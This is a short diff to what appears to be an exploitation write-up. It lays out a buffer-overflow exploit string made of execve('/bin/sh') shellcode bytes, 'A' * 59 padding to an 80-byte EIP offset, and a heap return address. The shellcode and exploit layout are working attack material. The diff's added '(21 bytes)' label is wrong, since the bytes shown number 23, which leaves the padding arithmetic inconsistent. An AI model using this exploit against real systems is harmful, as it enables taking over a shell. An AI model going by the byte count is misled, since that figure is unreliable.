@@ -93,7 +93,7 @@ Using [this compact system call opening a shell](http://shell-storm.org/shellcod
 ```
 
 Lets create our exploit string:
-1. Our malicious bytecode - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
+1. Our malicious bytecode (21 bytes) - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
 2. Buffer until EIP offset at 80 bytes - ```"A" * 59```
 3. Address of our malicious code, copied by strdup() to the heap - ```\x08\xa0\x04\x08```
 
